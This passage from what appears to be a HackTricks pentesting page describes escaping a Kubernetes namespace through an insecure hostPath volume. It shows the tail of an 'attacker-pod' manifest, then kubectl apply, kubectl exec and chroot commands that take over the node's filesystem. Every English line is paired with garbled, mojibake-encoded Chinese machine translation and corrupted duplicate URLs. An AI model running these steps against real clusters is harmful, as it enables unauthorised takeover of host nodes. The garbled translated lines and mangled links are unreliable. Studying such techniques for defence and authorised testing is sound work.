    imagePullPolicy: Always
    name: attacker-pod
    volumeMounts:
      - name: host-fs
        mountPath: /root
  restartPolicy: Never
```

[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

[åŸå§‹YAMLæ¥æº]ï¼ˆhttps://gist.github.com/abhisek/1909452A8AB9B8383A2E2E94F94F95AB0CCBAï¼‰

After that you create the pod

ä¹‹åæ‚¨åˆ›å»ºè±†èš

```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```

Now you can switch to the created pod as follows

ç°åœ¨æ‚¨å¯ä»¥åˆ‡æ¢åˆ°åˆ›å»ºçš„PODå¦‚ä¸‹

```bash
kubectl exec -it attacker-pod [-n <namespace>] -- bash # attacker-pod is the name defined in the yaml file
```

And finally you chroot into the node's system

æœ€åï¼Œæ‚¨å°†èŠ‚ç‚¹çš„ç³»ç»Ÿchroot

```bash
chroot /root /bin/bash
```

Information obtained from: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

ä»ï¼š[Kubernetesä½¿ç”¨Insecureä¸»æœºè·¯å¾„å·çªç ´çš„ä¿¡æ¯ - ç¬¬1éƒ¨åˆ†]ï¼ˆhttps://blog.appsecco.com/kubernetes-namespace-break-break-usef-using-insecure-insecure-host-path-volume-part-volume-part-1-b382f2a6e216ï¼‰ï¼‰ [æ”»å‡»å’Œæå«Kubernetesï¼šBust-a-Kube  - ç¬¬1é›†]ï¼ˆhttps://www.inguardians.com/attacking-and-defend--defending-kubernetes-bust-a-kube-kube-episode-1/ï¼‰

# References

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


